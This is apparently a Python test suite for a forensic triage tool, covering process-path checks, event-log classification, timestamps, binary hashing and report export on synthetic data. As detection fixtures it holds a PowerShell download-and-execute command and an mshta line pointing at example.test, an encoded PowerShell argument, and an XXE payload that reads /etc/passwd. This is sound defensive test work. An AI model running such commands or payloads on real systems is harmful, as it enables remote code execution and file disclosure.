"""Evidence-led DFIR regressions. Synthetic records only; no client samples."""
from __future__ import annotations
import csv
import hashlib
import json
import os
from pathlib import Path
import struct
import tempfile
import threading
import unittest
from unittest.mock import patch
from defusedxml import ElementTree as ET
from test_subject_007.case import Case
from test_subject_007.results import index_csv
from test_subject_007.summary import build_summary
from test_subject_007.util import atomic_json, hash_file, Cancelled
from test_subject_007.triage_rules import script_evidence,execution_signals,windows_path_assessment
from test_subject_007.chronology import timestamp,as_datetime
from test_subject_007.eventlogs import import_event_file,event_timeline,event_record
from test_subject_007.binaries import import_binary,import_hash_intelligence,artifact_inventory,describe_binary
from test_subject_007.assessment import save_assessment,evidence_state
from test_subject_007.reports import export_bundle


def event_xml(eid=4624,provider='Microsoft-Windows-Security-Auditing',channel='Security',host='LAB-PC',record='42',time='2026-10-28T13:15:55.1234567Z',data=None):
    from xml.sax.saxutils import escape,quoteattr
    data=data or {'TargetUserName':'LabUser','TargetDomainName':'LAB','LogonType':'10','IpAddress':'192.0.2.20','TargetLogonId':'0x123'}
    return ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
            '<Provider Name='+quoteattr(provider)+'/>'+'<EventID>'+str(eid)+'</EventID><TimeCreated SystemTime='+quoteattr(time)+'/>'
            '<EventRecordID>'+record+'</EventRecordID><Channel>'+channel+'</Channel><Computer>'+host+'</Computer></System><EventData>'+
            ''.join('<Data Name='+quoteattr(k)+'>'+escape(v)+'</Data>' for k,v in data.items())+'</EventData></Event>')


def inert_pe():
    """PE-shaped inert bytes for structure tests; not an executable program."""
    data=bytearray(1024);data[:2]=b'MZ';struct.pack_into('<I',data,0x3c,0x80)
    data[0x80:0x84]=b'PE\0\0';struct.pack_into('<H',data,0x86,1);struct.pack_into('<H',data,0x94,0)
    data[0x98:0xa0]=b'.empty\0\0';struct.pack_into('<II',data,0x98+16,16,512)
    return bytes(data)


class CaseFixture(unittest.TestCase):
    def setUp(self):
        self.tmp=tempfile.TemporaryDirectory();self.root=Path(self.tmp.name).resolve()
        self.image=self.root/'capture.raw';self.image.write_bytes(b'SYNTHETIC MEMORY FIXTURE')
        self.case=Case.create(self.root/'cases',self.image,'Synthetic DFIR review','Test analyst','Windows')
        self.case.metadata['synthetic_fixture']=True;self.case.save();self.seq=0
    def tearDown(self):self.case.close();self.tmp.cleanup()
    def add(self,plugin,rows,args=None):
        self.seq+=1;ident=f'fixture-{self.seq:03d}';folder=self.case.root/'runs'/ident;folder.mkdir()
        columns=['TreeDepth']+list(dict.fromkeys(k for r in rows for k in r))
        with (folder/'stdout.csv').open('w',encoding='utf-8',newline='') as stream:
            writer=csv.writer(stream,escapechar='\\');writer.writerow(columns)
            for row in rows:writer.writerow([0]+[row.get(k,'') for k in columns[1:]])
        count,cols,error=index_csv(folder/'stdout.csv',folder/'results.sqlite');self.assertFalse(error)
        run={'id':ident,'plugin':plugin,'arguments':args or [],'status':'completed','rows':count,'columns':cols,
             'started_utc':f'2026-11-01T00:00:{self.seq:02d}+00:00','error':'','index_error':'','offline':True}
        atomic_json(folder/'run.json',run);return run
    def source(self,name,data):
        path=self.root/name;path.write_bytes(data if isinstance(data,bytes) else data.encode());return path
    def intel(self,digest,label='malicious',representation='acquired_file',source='Synthetic analyst list',reference='LAB-TEST'):
        path=self.root/'intel.csv'
        with path.open('w',newline='',encoding='utf-8') as stream:
            w=csv.writer(stream);w.writerow(['sha256','label','source','reference','representation']);w.writerow([digest,label,source,reference,representation])
        return import_hash_intelligence(self.case,path)


class NoiseAndPathTests(CaseFixture):
    def test_113_pathext_rows_produce_no_script_findings(self):
        self.add('windows.envars.Envars',[{'PID':str(i+100),'Process':'svchost.exe','Variable':'PATHEXT','Value':'.EXE;.CMD;.VBS;.JS;.WSF;.PS1'} for i in range(113)])
        m=build_summary(self.case)
        self.assertEqual(m['actionable_count'],0);self.assertEqual(m['script_match_count'],0)
        self.assertEqual(len(m['suppressed_records']),113);self.assertEqual(m['records_latest'],113)
    def test_service_display_and_evtx_handle_not_execution(self):
        self.add('windows.svcscan.SvcScan',[{'Name':'vmicvmsession','Display':'Hyper-V PowerShell Direct Service','State':'SERVICE_STOPPED','Binary':'N/A','Binary (Registry)':r'C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted'}])
        self.add('windows.handles.Handles',[{'PID':'100','Type':'File','Name':r'\Device\HarddiskVolume3\Windows\System32\winevt\Logs\Windows PowerShell.evtx'}])
        m=build_summary(self.case);self.assertEqual(m['actionable_count'],0);self.assertEqual(m['script_match_count'],0)
        self.assertEqual(len(m['suppressed_records']),2)
    def test_notepad_script_argument_is_not_execution(self):
        self.add('windows.cmdline.CmdLine',[{'PID':'100','Process':'notepad.exe','Args':r'notepad.exe "C:\Temp\example.vbs"'}])
        m=build_summary(self.case);self.assertEqual(m['actionable_count'],0);self.assertEqual(m['script_match_count'],0)
    def test_normal_java_is_background_context(self):
        self.add('windows.cmdline.CmdLine',[{'PID':'100','Process':'java.exe','Args':r'"C:\Program Files\Java\bin\java.exe" -jar "C:\Approved App\business.jar"'}])
        m=build_summary(self.case);self.assertEqual(m['actionable_count'],0);self.assertEqual(m['script_match_count'],1)
    def test_exposed_script_and_jar_invocations_are_leads(self):
        self.add('windows.cmdline.CmdLine',[{'PID':'100','Process':'java.exe','Args':r'java.exe -jar C:\Users\Public\thing.jar'}, {'PID':'101','Process':'wscript.exe','Args':r'wscript.exe "\\fileserver\share\example.vbs"'}])
        m=build_summary(self.case);self.assertEqual(m['actionable_count'],2)
        self.assertTrue(all('unconfirmed' in f['confidence'] for f in m['findings']))
    def test_encoded_argument_requires_primary_interpreter(self):
        self.add('windows.cmdline.CmdLine',[{'PID':'100','Process':'notepad.exe','Args':'notepad.exe powershell -enc AAAA'}, {'PID':'101','Process':'powershell.exe','Args':'powershell.exe -EncodedCommand QQBCAA=='}])
        m=build_summary(self.case);self.assertEqual(m['actionable_count'],1);self.assertEqual(m['findings'][0]['pid'],101)
    def test_download_execute_and_mshta_are_specific(self):
        for command in ('powershell.exe IEX (New-Object Net.WebClient).DownloadString("https://example.test/a")','mshta.exe https://example.test/a.hta'):
            self.assertTrue(execution_signals('windows.cmdline.CmdLine',{'Args':command}))
    def test_file_reference_stays_background(self):
        self.add('windows.filescan.FileScan',[{'Name':r'\Device\HarddiskVolume3\Temp\a.vbs'}])
        m=build_summary(self.case);self.assertEqual(m['script_match_count'],1);self.assertEqual(m['actionable_count'],0)
    def test_expected_system_paths_and_custom_os_root(self):
        for path in (r'D:\WinNT\System32\svchost.exe',r'\SystemRoot\System32\svchost.exe',r'%SystemRoot%\SysWOW64\svchost.exe',r'\Device\HarddiskVolume3\WinNT\System32\svchost.exe'):
            self.assertFalse(windows_path_assessment(path,r'D:\WinNT'),path)
    def test_unexpected_system_path_is_not_clean_by_name(self):
        self.add('windows.info.Info',[{'Variable':'NtSystemRoot','Value':r'C:\Windows'}])
        self.add('windows.cmdline.CmdLine',[{'PID':'100','Process':'lsass.exe','Args':r'C:\Users\Public\lsass.exe'}])
        m=build_summary(self.case);self.assertTrue(any(f['category']=='Process integrity' for f in m['findings']))
        self.assertIn('not confirmed malicious',m['findings'][0]['status'])
    def test_missing_os_root_withholds_location_accusation(self):
        self.add('windows.cmdline.CmdLine',[{'PID':'100','Process':'lsass.exe','Args':r'D:\Windows\System32\lsass.exe'}])
        model=build_summary(self.case)
        self.assertFalse(any(f['category']=='Process integrity' for f in model['findings']))
        self.assertIn('withheld',model['process_inventory'][0]['location_baseline'])
    def test_arbitrary_appdata_application_not_blanket_suspicious(self):
        self.assertFalse(windows_path_assessment(r'C:\Users\Test\AppData\Local\Business\app.exe'))
        self.assertFalse(windows_path_assessment('lsass.exe'))
    def test_reused_pid_does_not_attribute_wrong_path(self):
        self.add('windows.psscan.PsScan',[{'PID':'100','PPID':'4','ImageFileName':'lsass.exe','Offset(V)':'0x1000','CreateTime':'2026-01-01 01:00:00 UTC'}, {'PID':'100','PPID':'4','ImageFileName':'lsass.exe','Offset(V)':'0x2000','CreateTime':'2026-01-01 02:00:00 UTC'}])
        self.add('windows.cmdline.CmdLine',[{'PID':'100','Process':'lsass.exe','Args':r'C:\Temp\lsass.exe'}])
        m=build_summary(self.case);self.assertFalse(any(f['category']=='Process integrity' for f in m['findings']))
        self.assertIn('Ambiguous',m['process_inventory'][0]['identity_status'])
    def test_office_parent_requires_compatible_lifetime(self):
        self.add('windows.pslist.PsList',[{'PID':'100','PPID':'4','ImageFileName':'WINWORD.EXE','Offset(V)':'0x1000','CreateTime':'2026-01-01 01:00:00 UTC'}, {'PID':'200','PPID':'100','ImageFileName':'powershell.exe','Offset(V)':'0x2000','CreateTime':'2026-01-01 02:00:00 UTC'}])
        self.add('windows.cmdline.CmdLine',[{'PID':'200','Process':'powershell.exe','Args':'powershell.exe -File C:\\Approved\\report.ps1'}])
        m=build_summary(self.case);self.assertTrue(any('Office-parent' in f['title'] for f in m['findings']))
    def test_known_good_never_whitelists_wrong_path(self):
        self.add('windows.info.Info',[{'Variable':'NtSystemRoot','Value':r'C:\Windows'}])
        binary=import_binary(self.case,self.source('file.exe',inert_pe()),100,r'C:\Temp\lsass.exe')
        self.intel(binary['sha256'],'known_good')
        self.add('windows.cmdline.CmdLine',[{'PID':'100','Process':'lsass.exe','Args':r'C:\Temp\lsass.exe'}])
        self.assertTrue(any(f['category']=='Process integrity' for f in build_summary(self.case)['findings']))


class TimestampTests(CaseFixture):
    def test_conversion_preserves_explicit_offset(self):
        result=timestamp('2026-10-28T21:15:55+08:00')
        self.assertEqual(result['time_utc'],'2026-10-28T13:15:55+00:00')
        self.assertEqual(result['time_pht'],'2026-10-28T21:15:55+08:00')
    def test_missing_and_naive_never_use_analysis_time(self):
        self.assertFalse(timestamp('N/A')['time_utc']);self.assertFalse(timestamp('2026-10-28 21:15:55')['time_utc'])
        self.assertIn('assumed',timestamp('2026-10-28 21:15:55',assume_utc=True)['time_status'])
    def test_old_process_time_still_fails_quality(self):
        self.assertEqual(as_datetime('1601-01-01 00:00:00 UTC').year,1601)
        self.add('windows.pslist.PsList',[{'PID':'100','ImageFileName':'test.exe','CreateTime':'1601-01-01 00:00:00 UTC'}])
        m=build_summary(self.case);self.assertEqual(m['excluded_pslist_rows'],1);self.assertFalse(m['memory_timeline'])
    def test_network_created_retained_and_not_called_logon(self):
        self.add('windows.netscan.NetScan',[{'PID':'100','Owner':'svchost.exe','Proto':'TCPv4','LocalAddr':'192.0.2.1','LocalPort':'3389','ForeignAddr':'192.0.2.2','ForeignPort':'50100','State':'ESTABLISHED','Created':'2026-10-28 13:15:55.000000 UTC'}])
        m=build_summary(self.case);n=m['network_context'][0]
        self.assertEqual(n['time_pht'],'2026-10-28T21:15:55+08:00')
        self.assertEqual(n['timestamp_field'],'Created');self.assertEqual(m['memory_timeline'][0]['kind'],'Network object created')
        self.assertFalse(m['event_timeline'])
    def test_network_missing_time_is_explicit(self):
        self.add('windows.netscan.NetScan',[{'PID':'100','LocalAddr':'192.0.2.1','LocalPort':'3389','Created':'N/A'}])
        m=build_summary(self.case);self.assertFalse(m['network_context'][0]['time_utc']);self.assertFalse(m['memory_timeline'])


class EventImportTests(CaseFixture):
    def test_event_import_records_source_and_timezone(self):
        src=self.source('security.xml','<Events>'+event_xml()+'</Events>')
        meta=import_event_file(self.case,src);rows,sources,issues=event_timeline(self.case)
        self.assertFalse(issues);self.assertEqual(len(rows),1);self.assertEqual(rows[0]['kind'],'Remote-interactive logon')
        self.assertEqual(rows[0]['time_utc'],'2026-10-28T13:15:55.123456+00:00');self.assertIn('1234567',rows[0]['time_raw'])
        self.assertEqual(rows[0]['host'],'LAB-PC');self.assertEqual(meta['sha256'],hash_file(src))
    def test_local_and_network_logons_not_rdp(self):
        for typ,label in (('2','Local interactive logon'),('3','Network logon'),('7','Unlock')):
            row=event_record(ET.fromstring(event_xml(data={'LogonType':typ})),{},'test')
            self.assertEqual(row['kind'],label)
    def test_ntlm_is_not_interactive(self):
        row=event_record(ET.fromstring(event_xml(4776,data={'TargetUserName':'LabUser','Status':'0x0'})),{},'test')
        self.assertEqual(row['kind'],'NTLM credential validation');self.assertEqual(row['logon_type'],'')
    def test_wrong_provider_or_channel_not_misclassified(self):
        self.assertIsNone(event_record(ET.fromstring(event_xml(provider='DifferentProvider')),{},'test'))
        self.assertIsNone(event_record(ET.fromstring(event_xml(channel='Application')),{},'test'))
    def test_rcm_auth_is_not_session_start(self):
        row=event_record(ET.fromstring(event_xml(1149,'Microsoft-Windows-TerminalServices-RemoteConnectionManager','Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational',data={'Param1':'Admin','Param2':'LAB','Param3':'192.0.2.20'})),{},'test')
        self.assertEqual(row['kind'],'RDP authentication event');self.assertEqual(row['source_address'],'192.0.2.20');self.assertIn('does not alone',row['interpretation'])
    def test_lsm_local_is_not_remote(self):
        row=event_record(ET.fromstring(event_xml(21,'Microsoft-Windows-TerminalServices-LocalSessionManager','Microsoft-Windows-TerminalServices-LocalSessionManager/Operational',data={'User':'LAB\\User','Address':'LOCAL','SessionID':'1'})),{},'test')
        self.assertIn('(local)',row['kind'])
    def test_duplicate_log_import_does_not_double_count(self):
        src=self.source('events.xml','<Events>'+event_xml()+'</Events>')
        import_event_file(self.case,src);import_event_file(self.case,src)
        rows,sources,issues=event_timeline(self.case);self.assertEqual(len(rows),1);self.assertEqual(len(rows[0]['import_references']),2)
    def test_different_host_same_record_kept_separate(self):
        import_event_file(self.case,self.source('a.xml',event_xml(host='HOST-A')))
        import_event_file(self.case,self.source('b.xml',event_xml(host='HOST-B')))
        rows,_,_=event_timeline(self.case);self.assertEqual(len(rows),2);self.assertEqual({r['host'] for r in rows},{'HOST-A','HOST-B'})
    def test_xxe_is_rejected(self):
        src=self.source('evil.xml','<!DOCTYPE Event [<!ENTITY payload SYSTEM "file:///etc/passwd">]><Event>&payload;</Event>')
        with self.assertRaises(Exception):import_event_file(self.case,src)
        self.assertFalse(list((self.case.root/'supplements').glob('*/manifest.json')))
    def test_same_size_source_mutation_detected(self):
        meta=import_event_file(self.case,self.source('events.xml',event_xml()))
        path=self.case.root/meta['case_path'];data=path.read_bytes();path.write_bytes(data.replace(b'LAB-PC',b'BAD-PC'))
        rows,_,issues=event_timeline(self.case);self.assertFalse(rows);self.assertTrue(issues)
    def test_limit_records_partial_not_successful_full_coverage(self):
        with patch('test_subject_007.eventlogs.MAX_RECORDS',1):
            meta=import_event_file(self.case,self.source('events.xml','<Events>'+event_xml(record='1')+event_xml(record='2')+'</Events>'))
        self.assertTrue(meta['limited']);self.assertEqual(meta['coverage'],'Partial')
    def test_missing_event_time_preserved_not_invented(self):
        row=event_record(ET.fromstring(event_xml(time='')),{},'test');self.assertFalse(row['time_utc']);self.assertEqual(row['time_status'],'Unavailable')
    def test_event_source_records_tamper_rejected(self):
        meta=import_event_file(self.case,self.source('events.xml',event_xml()))
        records=self.case.root/'supplements'/meta['id']/'records.json';records.write_text('[]')
        rows,_,issues=event_timeline(self.case);self.assertFalse(rows);self.assertTrue(issues)


class BinaryAndAssessmentTests(CaseFixture):
    def test_computed_hash_from_actual_bytes(self):
        data=inert_pe();src=self.source('original.exe',data)
        item=import_binary(self.case,src,100,r'C:\Temp\example.exe')
        self.assertEqual(item['sha256'],hashlib.sha256(data).hexdigest());self.assertEqual(src.read_bytes(),data)
        self.assertEqual(item['signature_status'],'Not verified');self.assertEqual(item['representation'],'acquired_file')
    def test_full_memory_hash_is_not_imported_as_executable(self):
        with self.assertRaises(ValueError):import_binary(self.case,self.image)
    def test_cancellation_leaves_no_successful_import(self):
        stop=threading.Event();stop.set()
        with self.assertRaises(Cancelled):import_binary(self.case,self.source('a.exe',inert_pe()),cancel=stop)
        self.assertFalse(list((self.case.root/'supplements').glob('*/manifest.json')))
    def test_truncated_pe_explicit(self):
        path=self.source('partial.exe',inert_pe()[:100]);self.assertIn('Truncated',describe_binary(path)['structure'])
    def test_known_bad_hash_requires_source_and_representation(self):
        binary=import_binary(self.case,self.source('a.exe',inert_pe()),100)
        self.intel(binary['sha256'],representation='memory_reconstructed_pe')
        rows,findings,issues=artifact_inventory(self.case,[]);self.assertFalse(findings)
        self.intel(binary['sha256']);rows,findings,issues=artifact_inventory(self.case,[])
        self.assertEqual(len(findings),1);self.assertIn('Synthetic analyst list',findings[0]['context'])
        self.assertIn('supplied',rows[0]['reputation'])
    def test_missing_intelligence_source_refused(self):
        with self.assertRaises(ValueError):self.intel('0'*64,source='')
    def test_hash_shaped_string_not_promoted_to_computed_hash(self):
        self.add('windows.cmdline.CmdLine',[{'PID':'100','Process':'java.exe','Args':'java.exe '+('a'*64)}])
        self.assertEqual(build_summary(self.case)['binary_evidence'],[])
    def test_conflicting_intelligence_visible(self):
        item=import_binary(self.case,self.source('a.exe',inert_pe()))
        self.intel(item['sha256'],'malicious');self.intel(item['sha256'],'known_good')
        rows,findings,_=artifact_inventory(self.case,[]);self.assertIn('Conflicting',rows[0]['reputation']);self.assertEqual(findings[0]['priority'],'Medium')
    def test_extracted_pe_hash_is_not_original_file_hash(self):
        run=self.add('windows.pslist.PsList',[{'PID':'100','ImageFileName':'example.exe'}],['--pid','100','--dump'])
        folder=self.case.root/'runs'/run['id'];(folder/'artifacts').mkdir();file=folder/'artifacts'/'100.example.exe.0x140000000.dmp';file.write_bytes(inert_pe())
        run['output_files']=[{'path':'artifacts/'+file.name,'size':file.stat().st_size,'sha256':hash_file(file)}];atomic_json(folder/'run.json',run)
        items,_,_=artifact_inventory(self.case,[run]);self.assertEqual(items[0]['representation'],'memory_reconstructed_pe');self.assertIn('not the original',items[0]['hash_scope'])
        file.write_bytes(b'changed');items,findings,issues=artifact_inventory(self.case,[run]);self.assertEqual(items[0]['sha256'],'');self.assertTrue(issues)
    def test_report_keeps_hash_time_noise_and_analysis_distinct(self):
        import_binary(self.case,self.source('a.exe',inert_pe()))
        import_event_file(self.case,self.source('events.xml',event_xml()))
        self.add('windows.envars.Envars',[{'Variable':'PATHEXT','Value':'.VBS;.JS','PID':'100'}])
        result=export_bundle(self.case,self.root/'reports')
        self.assertFalse(result.get('errors'))
        html=Path(result['paths']['html']).read_text()
        self.assertIn('2026-10-28T13:15:55',html);self.assertIn(hashlib.sha256(inert_pe()).hexdigest(),html)
        for filename in ('suppression-ledger.csv','executable-hashes.csv','event-timeline.csv','memory-timeline.csv','process-inventory.csv'):
            self.assertTrue((Path(result['paths']['html']).parent/filename).is_file(),filename)
    def test_analyst_conclusion_requires_reason_and_references(self):
        with self.assertRaises(ValueError):save_assessment(self.case,'Authorized activity supported','','')
    def test_analyst_conclusion_becomes_stale_with_new_evidence(self):
        saved=save_assessment(self.case,'Authorized activity supported','Synthetic lab approval','Ticket LAB-001')
        self.assertEqual(saved['evidence_state'],evidence_state(self.case))
        import_binary(self.case,self.source('a.exe',inert_pe()))
        m=build_summary(self.case);self.assertTrue(m['analyst_assessment_stale'])
